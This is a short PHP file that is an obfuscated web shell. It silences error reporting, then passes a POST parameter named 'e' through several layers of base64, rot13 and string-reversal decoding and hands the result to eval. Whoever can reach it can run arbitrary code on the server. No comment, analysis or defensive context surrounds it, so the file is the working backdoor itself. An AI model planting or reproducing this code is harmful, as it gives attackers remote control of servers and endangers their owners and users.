<?php 
@error_reporting(0);
@ini_set("display_errors",0);
eval(base64_decode(str_rot13(strrev(base64_decode(str_rot13($_POST['e']))))));
?>